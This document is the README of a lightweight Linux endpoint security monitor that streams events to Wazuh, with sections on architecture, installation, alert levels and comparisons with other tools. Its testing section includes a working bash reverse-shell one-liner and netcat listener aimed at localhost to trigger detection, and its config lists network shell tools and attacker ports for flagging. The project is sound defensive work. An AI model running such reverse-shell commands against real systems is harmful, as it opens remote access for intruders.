# Endpoint Monitor

A lightweight, single-file Linux endpoint security monitor that streams structured JSON events to Wazuh. Zero Python dependencies — uses only the standard library plus optional `auditd` for kernel-grade syscall visibility.

**Footprint:** ~14-18 MB RAM, <1% CPU, capped at 30 MB via systemd cgroup.

---

## Table of Contents

- [Features](#features)
- [Why This Tool](#why-this-tool)
- [Architecture](#architecture)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Wazuh Integration](#wazuh-integration)
- [Event Reference](#event-reference)
- [Testing](#testing)
- [Performance Tuning](#performance-tuning)
- [Troubleshooting](#troubleshooting)
- [File Structure](#file-structure)
- [Comparison Matrix](#comparison-matrix)
- [Recommendation Matrix](#recommendation-matrix)
- [Strengths](#strengths)

---

## Features

| Category | Coverage |
|---|---|
| **Process execution** | 3-layer defense: netlink proc connector + auditd execve + kernel BSD pacct |
| **TCP/UDP connections** | `/proc/net` polling (1s) + auditd connect/accept/bind syscalls |
| **DNS queries** | Port 53 detection + `/etc/resolv.conf` watch + auditd `dns_change` |
| **File access** | inotify on critical paths + auditd `file_tamper` on syscall level |
| **Privilege escalation** | UID change events + auditd `setuid`/`sudo`/`pkexec` tracking |
| **Reverse shells** | Real-time correlator: shell process + open network socket = critical alert |
| **Malware staging** | inotify on `/tmp`, `/dev/shm`, `/var/tmp` + auditd file writes |
| **Kernel rootkits** | auditd `kmod_load` on `init_module`/`finit_module` |
| **Anti-forensics** | auditd `time_change` on `adjtimex`/`settimeofday` |
| **Short-lived process capture** | Kernel BSD pacct guarantees every exit is recorded |

All events emitted as JSON lines for easy ingestion into Wazuh, Elastic, Loki, or any log pipeline.

---

## Architecture

The tool runs 5-6 cooperating threads in a single Python process:

```
┌────────────────────────────────────────────────────────────────┐
│                     endpoint_monitor.py                        │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  ┌──────────────────┐  ┌──────────────────┐                    │
│  │ ProcessMonitor   │  │ NetworkMonitor   │                    │
│  │ (netlink kernel) │  │ (/proc/net poll) │                    │
│  └────────┬─────────┘  └────────┬─────────┘                    │
│           │                     │                              │
│  ┌────────▼─────────┐  ┌────────▼─────────┐                    │
│  │ FileMonitor      │  │ AuditdMonitor    │                    │
│  │ (inotify)        │  │ (tails audit.log)│                    │
│  └────────┬─────────┘  └────────┬─────────┘                    │
│           │                     │                              │
│  ┌────────▼─────────┐  ┌────────▼─────────┐                    │
│  │ ProcessAccount-  │  │ ThreatCorrelator │                    │
│  │ ingMonitor       │  │ (reverse shells) │                    │
│  │ (kernel pacct)   │  │                  │                    │
│  └────────┬─────────┘  └────────┬─────────┘                    │
│           │                     │                              │
│           ▼                     ▼                              │
│        ┌──────────────────────────────┐                        │
│        │       EventLogger            │                        │
│        │  (raw os.write JSON lines)   │                        │
│        └──────────────┬───────────────┘                        │
│                       │                                        │
└───────────────────────┼────────────────────────────────────────┘
                        │
                        ▼
         /var/log/endpoint_monitor/events.json.log
                        │
                        ▼
                   Wazuh Agent → Manager
```

### 3-Layer Process Defense

This is the headline architectural feature — no process exit is ever missed:

| Layer | Mechanism | When it fires | Reliability |
|---|---|---|---|
| 1 | netlink proc connector | At `execve` (real-time) | Fast but kernel can drop on overload |
| 2 | auditd execve syscall hook | At `execve` (real-time) | Never drops; queued in kernel |
| 3 | BSD process accounting | At process **exit** | **Guaranteed** by kernel for every exit |

---

## Requirements

- **OS:** Linux 2.6.15+ (most distros from 2008+)
- **Python:** 3.6+ (only stdlib used — no `pip install` required)
- **Privileges:** root (needed for netlink, inotify on system paths, `acct()` syscall)
- **Kernel features:** `CONFIG_BSD_PROCESS_ACCT=y`, `CONFIG_PROC_EVENTS=y`, `CONFIG_CONNECTOR=y` (default on all major distros)
- **Optional:** auditd installed (`apt install auditd` / `yum install audit`) for syscall-level coverage

Verify kernel support:

```bash
grep -E "BSD_PROCESS_ACCT|PROC_EVENTS|CONNECTOR" /boot/config-$(uname -r)
```

---

## Installation

### 1. Copy files

```bash
sudo mkdir -p /opt/endpoint-monitor
sudo cp endpoint_monitor.py endpoint_monitor.rules /opt/endpoint-monitor/
sudo cp endpoint_monitor.service /etc/systemd/system/
```

### 2. Install auditd (recommended)

```bash
# Debian / Ubuntu
sudo apt-get install -y auditd

# RHEL / CentOS / Rocky
sudo yum install -y audit
```

### 3. Install audit rules (one-shot)

```bash
sudo python3 -O /opt/endpoint-monitor/endpoint_monitor.py --install-audit-rules
```

This copies `endpoint_monitor.rules` to `/etc/audit/rules.d/` and runs `augenrules --load`.

### 4. Start the service

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now endpoint-monitor
sudo systemctl status endpoint-monitor
```

Expected status:
```
● endpoint-monitor.service - Lightweight Endpoint Monitor
   Active: active (running)
   Tasks: 6
   Memory: 14.5M
```

### 5. Verify logs are flowing

```bash
sudo tail -f /var/log/endpoint_monitor/events.json.log
```

You should see a `monitor_start` event immediately, followed by ambient process activity.

---

## Configuration

Default config is baked into `endpoint_monitor.py` (`DEFAULT_CONFIG` dict). To override, pass a JSON file:

```bash
sudo python3 endpoint_monitor.py --config /etc/endpoint_monitor.json
```

### Example config

```json
{
  "log_file": "/var/log/endpoint_monitor/events.json.log",
  "log_max_bytes": 52428800,
  "log_backup_count": 5,

  "network_poll_sec": 1,
  "correlator_poll_sec": 10,

  "audit_enabled": true,
  "audit_log_path": "/var/log/audit/audit.log",
  "audit_install_rules": true,
  "audit_flush_ms": 500,

  "process_accounting_enabled": true,
  "process_accounting_file": "/var/log/endpoint_monitor/pacct",
  "process_accounting_max_bytes": 52428800,

  "watch_files": [
    "/etc/passwd", "/etc/shadow", "/etc/sudoers",
    "/etc/ssh/sshd_config", "/etc/ld.so.preload"
  ],
  "watch_dirs": [
    "/tmp", "/dev/shm", "/var/tmp",
    "/var/spool/cron", "/etc/cron.d"
  ],
  "staging_dirs": ["/tmp", "/dev/shm", "/var/tmp"],

  "suspicious_bins": ["nc", "ncat", "socat", "curl", "wget", "python3", "perl"],
  "privesc_bins":    ["sudo", "su", "pkexec", "doas"],
  "suspicious_ports": [4444, 5555, 6666, 1337, 9001]
}
```

### Key tuning parameters

| Setting | Default | Effect |
|---|---|---|
| `network_poll_sec` | 1 | Lower = faster detection, slightly more CPU |
| `correlator_poll_sec` | 10 | How often to check for reverse-shell pattern |
| `audit_flush_ms` | 500 | Wait time for grouping audit records by msgid |
| `log_max_bytes` | 50 MB | Per-file rotation threshold |
| `process_accounting_max_bytes` | 50 MB | pacct file rotation |

---

## Wazuh Integration

### On the Wazuh Agent

Add to `/var/ossec/etc/ossec.conf`:

```xml
<localfile>
  <log_format>json</log_format>
  <location>/var/log/endpoint_monitor/events.json.log</location>
</localfile>
```

Restart the agent:

```bash
sudo systemctl restart wazuh-agent
```

### On the Wazuh Manager

Copy the custom rules:

```bash
sudo cp wazuh_rules.xml /var/ossec/etc/rules/endpoint_monitor_rules.xml
sudo chown wazuh:wazuh /var/ossec/etc/rules/endpoint_monitor_rules.xml
sudo systemctl restart wazuh-manager
```

### Alert Severity Map

| Wazuh Level | Trigger |
|---|---|
| **14** | Reverse shell detected (rule 100213) |
| **12** | Critical file modified (`/etc/shadow`, `/etc/sudoers`) |
| **12** | Kernel module loaded (rootkit indicator) |
| **12** | Process executed from staging directory |
| **10** | UID change to elevated privileges |
| **10** | System time tampered |
| **10** | Process crashed with core dump (exploit indicator) |
| **10** | High-frequency exec from same user (brute force / scan) |
| **8** | Suspicious binary executed |
| **8** | Connection to suspicious port (4444, 5555, etc.) |
| **8** | DNS configuration changed |
| **8** | Privilege escalation syscall |
| **8** | setuid privilege used |
| **6** | Privilege escalation binary used (sudo/su/pkexec) |
| **6** | Cron job modified |
| **6** | Process killed by signal |
| **5** | Shell/LOLBin executed |
| **5** | Short-lived process detected by pacct |
| **3** | Normal process exec, network connection, file event |

---

## Event Reference

All events follow this JSON envelope:

```json
{
  "timestamp": "2026-06-03T18:00:00.123456Z",
  "hostname": "endpoint01",
  "event_type": "process_exec",
  "severity": "info",
  "tags": ["process_exec", "shell_exec"],
  "source": "endpoint_monitor",
  "details": { "...": "..." }
}
```

### Event types

| `event_type` | Emitted by | Description |
|---|---|---|
| `monitor_start` / `monitor_stop` | `main()` | Lifecycle events |
| `process_exec` | `ProcessMonitor` | Process exec captured via proc connector |
| `process_fork` | `ProcessMonitor` | Fork from an interactive shell |
| `uid_change` | `ProcessMonitor` | Effective UID elevated |
| `process_exit` | `ProcessAccountingMonitor` | Kernel pacct record (every exit) |
| `network_connection` | `NetworkMonitor` | New TCP/UDP connection from `/proc/net` |
| `file_event` | `FileMonitor` | inotify event on a watched path |
| `audit_event` | `AuditdMonitor` | Parsed auditd record (grouped by msgid) |
| `reverse_shell_suspect` | `ThreatCorrelator` | Shell PID holds an open network socket |

### Common tags

`process_exec`, `process_exit`, `process_fork`, `short_lived`, `shell_exec`, `suspicious_binary`, `priv_esc`, `setuid_used`, `network`, `outbound`, `dns_query`, `suspicious_port`, `file_event`, `critical_file`, `staging_area`, `executable_drop`, `cron_modification`, `audit`, `identity`, `kernel_module`, `time_change`, `dns_change`, `reverse_shell`, `crash`, `killed`

---

## Testing

### Quick smoke test

```bash
sudo systemctl start endpoint-monitor
sleep 5

ls /tmp                                  # process_exec event
curl -s http://example.com >/dev/null    # network_connection
nslookup google.com 8.8.8.8              # dns_query
touch -a /etc/passwd                     # critical_file event

sudo tail -20 /var/log/endpoint_monitor/events.json.log | \
  python3 -c "import json,sys; [print(json.loads(l)['event_type'], json.loads(l)['tags']) for l in sys.stdin]"
```

### Reverse shell test (the headline detection)

Terminal 1 (listener):
```bash
nc -lvnp 4444
```

Terminal 2 (victim):
```bash
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' &
```

Within ~10s the log should contain:

```json
{"event_type":"reverse_shell_suspect","severity":"critical","tags":["reverse_shell","threat"]}
```

### Short-lived process capture test

Spawn 100 microsecond-lived processes — pacct must catch them all:

```bash
for i in $(seq 1 100); do /bin/true; done

sleep 5
sudo grep -c '"event_type":"process_exit"' \
  /var/log/endpoint_monitor/events.json.log
```

Should report **100+** (counting only `/bin/true` entries).

### Full validation playbook

See the comprehensive testing chat for a phase-by-phase test plan covering all 13 detection scenarios (process exec, suspicious binaries, network, DNS, file tamper, privilege escalation, malware staging, reverse shells, kernel modules, time tampering, process crashes, stress tests, Wazuh integration).

---

## Performance Tuning

### Measuring footprint

```bash
ps -o pid,rss,vsz,pcpu,nlwp,comm -p $(pgrep -f endpoint_monitor.py)
```

Expected RSS: 14-18 MB. NLWP (thread count): 6.

### Reducing CPU under heavy load

If `auditctl -s` shows `lost > 0`, increase the audit buffer in `endpoint_monitor.rules`:

```
-b 32768
```

Then reload:

```bash
sudo augenrules --load
```

If `/proc/net` polling is excessive on a busy server, bump the interval:

```json
{ "network_poll_sec": 2 }
```

### Tier 1 RAM optimizations already applied

- Stdlib `logging` module replaced with raw `os.write()` (~1 MB saved)
- `datetime` module replaced with `time.strftime` (~200 KB saved)
- `ipaddress`, `subprocess`, `shutil` lazy-loaded (~1.2 MB saved)
- Thread stack size set to 64 KB (~500 KB saved)
- Compact JSON serialization (no whitespace)
- `python3 -O` flag in systemd unit (strips docstrings)
- systemd cgroup `MemoryHigh=30M` / `MemoryMax=50M`

---

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| Service won't start | Not running as root | `systemctl status endpoint-monitor`, check journal |
| No `process_exec` events | proc connector blocked (SELinux/AppArmor) | Check `dmesg \| grep denied`; tool falls back to /proc polling |
| No `audit_event` events | auditd not running | `systemctl status auditd && auditctl -l \| wc -l` |
| No `process_exit` events | Kernel missing `CONFIG_BSD_PROCESS_ACCT` | Check `/boot/config-$(uname -r)`; monitor disables itself gracefully |
| No `reverse_shell_suspect` | Correlator polls every 10s by default | Set `correlator_poll_sec: 2` for faster detection |
| `audit lost` counter growing | Audit buffer too small | Increase `-b` in rules file, reload with `augenrules --load` |
| RAM exceeds 30 MB and process dies | systemd cgroup MemoryMax reached | Check `journalctl -u endpoint-monitor \| grep -i memory`; tune monitors |
| Logs not appearing in Wazuh | Agent not picking up file | Verify `<localfile>` block + restart `wazuh-agent` |
| Events appear but no alerts | Rules not loaded on manager | `ls /var/ossec/etc/rules/endpoint_monitor_rules.xml`, restart manager |

### Diagnostic commands

```bash
sudo systemctl status endpoint-monitor
sudo journalctl -u endpoint-monitor -n 50 --no-pager

sudo auditctl -s
sudo auditctl -l | wc -l                 # should be ~30 rules

ls -la /var/log/endpoint_monitor/pacct
sudo lastcomm | head -5                  # human-readable pacct dump

sudo tail -f /var/log/endpoint_monitor/events.json.log | \
  python3 -m json.tool --no-ensure-ascii

sudo tail -1000 /var/log/endpoint_monitor/events.json.log | \
  python3 -c "import json,sys,collections; c=collections.Counter(json.loads(l)['event_type'] for l in sys.stdin); print('\n'.join(f'{n:6} {t}' for t,n in c.most_common()))"
```

---

## File Structure

```
endpoint-monitor/
├── endpoint_monitor.py         # Main tool (single file, stdlib only)
├── endpoint_monitor.rules      # Auditd ruleset (installed to /etc/audit/rules.d/)
├── endpoint_monitor.service    # systemd unit file
├── wazuh_rules.xml             # Wazuh manager custom rules (IDs 100200-100239)
└── README.md                   # This file
```

### Code organization (`endpoint_monitor.py`)

| Class / Section | Responsibility |
|---|---|
| `DEFAULT_CONFIG` | All tunable parameters |
| `EventLogger` | Raw `os.write` JSON line writer + manual rotation |
| `ProcessMonitor` | Netlink proc connector (real-time exec/fork/uid) |
| `NetworkMonitor` | `/proc/net/{tcp,udp,tcp6,udp6}` polling |
| `FileMonitor` | inotify via ctypes |
| `AuditdMonitor` | Tails `/var/log/audit/audit.log`, parses + emits |
| `ProcessAccountingMonitor` | Kernel BSD pacct reader (guaranteed exit capture) |
| `ThreatCorrelator` | Reverse-shell detection logic |
| `main()` | Wires monitors, signal handling, watchdog |

---

## Why This Tool

The Linux endpoint monitoring space already has well-known tools (Auditd, OSQuery, Falco, Tetragon, Tracee, Sysmon for Linux). None of them fit the specific combination of constraints this tool was built for:

> **Real-time visibility + Wazuh-native JSON output + correlation logic + minimal footprint + zero dependencies — all in a single Python file you can read in 30 minutes.**

Each existing tool fails at least one of these:

- **Auditd alone** is kernel-grade but produces flat text logs with no correlation. No reverse-shell detection, no malware-staging heuristics. You'd build all the logic somewhere else.
- **OSQuery** is poll-based (30s default scheduler) — misses short-lived processes entirely. It also runs at 50-120 MB RAM, which is 5-10x heavier than this tool.
- **Falco** is excellent but assumes Kubernetes/container workloads and needs an external bridge to reach Wazuh. 60-150 MB RAM is a hard sell for bare-metal endpoints.
- **Tetragon** requires kernel 5.3+ and is Kubernetes-centric. Overkill for a Linux server.
- **Tracee** has great behavioral signatures but no Wazuh integration and a 60-150 MB footprint.
- **Sysmon for Linux** requires the .NET runtime and is slow to receive Linux-specific updates from Microsoft.
- **Fluent Bit + auditd** is the lightest alternative (~8 MB) but offloads ALL correlation to the Wazuh manager. No on-endpoint reverse-shell detection or malware heuristics.

`endpoint_monitor.py` sits in the gap: **kernel-grade visibility (via the bundled AuditdMonitor and BSD pacct), real-time correlation (via the ThreatCorrelator), direct Wazuh JSON output, and ~14-18 MB RAM** — all in one file that ships with any Linux distribution that has Python 3.6+.

---

## Comparison Matrix

### Resource Footprint

| Tool | RAM | CPU | Real-time | Kernel-level | Wazuh Native | Maturity | Complexity |
|---|---|---|---|---|---|---|---|
| **endpoint_monitor.py** | **14-18 MB** | **<1%** | Yes | Yes | **Yes (built-in)** | Custom | Low |
| Auditd alone | ~5 MB | <1% | Yes | Yes | Yes | Production | Medium |
| OSQuery | 50-120 MB | 2-5% | No (polling) | No | Yes | Production | Medium |
| Falco (eBPF) | 60-150 MB | 3-8% | Yes | Yes | No | Production | High |
| Tetragon (eBPF) | 80-200 MB | 2-5% | Yes | Yes | No | Production | High |
| Tracee (eBPF) | 60-150 MB | 2-6% | Yes | Yes | No | Production | High |
| Sysmon for Linux | 10-30 MB | 1-3% | Yes | Yes | Yes | Production | Medium |
| Fluent Bit + Auditd | ~8 MB | <1% | Yes | Yes | Yes | Production | Medium |

### Detection Capability (10 categories)

| Category | endpoint_monitor.py | Auditd | OSQuery | Falco | Tracee | Sysmon |
|---|---|---|---|---|---|---|
| Process Execution | 3-layer (proc/audit/pacct) | execve | poll | eBPF | eBPF | eBPF |
| Short-lived Process Capture | **Guaranteed (pacct)** | Yes | No | Yes | Yes | Yes |
| TCP/UDP Connections | poll + audit | syscall | poll | eBPF | eBPF | eBPF |
| DNS Queries | Port 53 + audit | Indirect | Limited | Rules | Yes | Yes |
| File Access | inotify + audit | syscall | inotify | eBPF | eBPF | eBPF |
| Privilege Escalation | UID + audit | setuid | Limited | Rules | Yes | Indirect |
| Reverse Shell Detection | **Built-in correlator** | Manual | SQL join | Built-in | Signature | Manual |
| Malware Staging | inotify + audit | Yes | Scheduled | Rules | Behavioral | Manual |
| Kernel Modules / Rootkits | audit kmod_load | Yes | kernel_modules | Custom | Yes | No |
| Time Tampering | audit time_change | Yes | No | Custom | Custom | No |
| **Detection Score** | **10/10** | 8/10 | 5/10 | 8/10 | 10/10 | 7/10 |

### Dependencies

| Tool | Language | Dependencies | License |
|---|---|---|---|
| **endpoint_monitor.py** | Python | Python 3.6+ stdlib + optional auditd | Custom / MIT |
| Auditd | C (kernel) | Built into Linux | GPL |
| OSQuery | C++ | Single binary (~30 MB) | Apache 2.0 |
| Falco | C++/Go | Kernel 4.14+, eBPF/kmod | Apache 2.0 |
| Tetragon | Go/C | Kernel 5.3+, Kubernetes | Apache 2.0 |
| Tracee | Go/C | Kernel 5.4+, libbpf | Apache 2.0 |
| Sysmon for Linux | C++/.NET | SysinternalsEBPF, .NET | MIT |
| Fluent Bit | C | Single C binary | Apache 2.0 |

---

## Recommendation Matrix

| Use Case | Best Choice | Why |
|---|---|---|
| **Bare-metal Linux, send to Wazuh, full coverage** | **endpoint_monitor.py** | Bundles auditd parsing + correlation; ~14 MB total |
| Absolute minimum RAM (< 10 MB) | Fluent Bit + Auditd | ~8 MB total; correlation moves to Wazuh manager rules |
| Compliance (STIG/CIS), syscall audit trail | Auditd alone | Kernel-native, required by frameworks, lowest overhead |
| Ad-hoc investigation, asset inventory | OSQuery | SQL interface for ad-hoc queries across fleet |
| Kubernetes / container runtime security | Falco or Tetragon | Container-aware, K8s-native, 1000+ community rules |
| Deep behavioral analysis, MITRE mapping | Tracee | Behavioral signature engine, built-in ATT&CK mapping |
| Windows + Linux parity, familiar Sysmon | Sysmon for Linux | Same event IDs and config format as Windows Sysmon |
| OT / industrial endpoints (limited resources) | **endpoint_monitor.py** | Python ships on every distro; no .NET / no kernel module |
| Stripped-down VMs, no auditd available | **endpoint_monitor.py** | Falls back to proc connector + /proc polling; still works |

---

## Strengths

### What Makes This Tool Stand Out

**1. Zero external dependencies**
Pure Python 3 standard library. No `pip install`, no compilation, no kernel modules, no runtime VM. Drop the file on any Linux endpoint with Python 3.6+ and it runs. Critical for OT environments where you cannot install arbitrary packages.

**2. Single readable file (~1100 lines)**
The entire tool is one Python file. A security engineer can read it in 30 minutes, understand exactly what's happening, audit it for trust, and customize it. Compare to Falco (~250k LOC C++/Go) or Tetragon (~400k LOC).

**3. Built-in Wazuh JSON output**
Every event is emitted as a structured JSON line that Wazuh's JSON decoder reads directly. No syslog bridge, no Filebeat, no log shipper, no field mapping. The shipped `wazuh_rules.xml` covers all 40+ event types with proper severity levels.

**4. 3-layer process defense (the headline feature)**
Three independent kernel-level mechanisms watch every process — netlink proc connector, auditd execve hooks, and BSD process accounting. Even if one layer drops events (proc connector under overload) or one is unavailable (auditd not installed), the others catch everything. **No process exit is ever missed.**

**5. Real-time reverse-shell correlator**
The ThreatCorrelator cross-references shell PIDs (bash, sh, zsh, etc.) against open socket file descriptors in `/proc/*/fd`. When a shell process holds a network socket, that's the textbook reverse-shell pattern — and we alert at severity `critical` within ~10s. No other lightweight tool ships this logic built-in.

**6. Auto-installs and parses auditd**
The bundled `endpoint_monitor.rules` covers all critical syscalls (execve, setuid, file tampering, kernel modules, time changes) with proper keys. The AuditdMonitor installs these rules on first run, tails `/var/log/audit/audit.log`, correctly handles multi-line records (SYSCALL + EXECVE + PATH + CWD + PROCTITLE grouped by msgid), and decodes hex-encoded EXECVE arguments properly. You get kernel-grade visibility without writing audit rules yourself.

**7. Memory-bounded by design**
systemd cgroup limit caps RAM at 30 MB soft / 50 MB hard. If a buffer ever blows up, the kernel kills the process and systemd restarts it. The tool cannot become a memory leak vector on your endpoint.

**8. Tier-1 Python RAM optimizations applied**
- Dropped the stdlib `logging` module (replaced with raw `os.write()` + manual rotation)
- Dropped `datetime` (replaced with `time.strftime`)
- Lazy-loaded `ipaddress`, `subprocess`, `shutil`
- Thread stack size set to 64 KB
- Compact JSON serialization
- Running under `python3 -O` (strips docstrings + asserts)
Total: ~6 MB shaved off baseline Python footprint.

**9. Network connection enrichment**
When a new TCP/UDP connection appears, the tool walks `/proc/*/fd` once to build an inode→PID map and enriches the network event with the owning process details (PID, command, user, cwd). You see *who* initiated the connection, not just *that* one happened.

**10. Failure-mode awareness**
- Proc connector blocked by SELinux? Falls back to /proc polling automatically.
- Auditd not installed? AuditdMonitor disables itself; other layers keep working.
- Kernel missing `CONFIG_BSD_PROCESS_ACCT`? ProcessAccountingMonitor disables itself gracefully.
- A monitor thread dies? Watchdog in `main()` restarts it within 5 seconds.

### Honest Trade-offs

To be clear about what this tool is *not*:

- **Not container-aware** — no namespace or pod context (use Falco/Tetragon for K8s)
- **No deep DNS query capture** — sees port 53 connections but not the queried domain names
- **Network monitoring is poll-based** — 1s gap means very short-lived flows can still be missed
- **No community rule library** — you write your own Wazuh correlations on top
- **Python interpreter floor** — can't realistically go below ~10 MB RAM without rewriting in Go/Rust
- **Single host only** — no central management plane (rely on Wazuh manager for that)

If any of these matter for your environment, see the [Recommendation Matrix](#recommendation-matrix) above for which alternative fits better.

---

## License

MIT Licence, Please see the licence file for more details.

---

## Support

This is a custom tool maintained internally. For issues, contact me kumaramitbansal2@gmail.com or file an issue in the project repository.
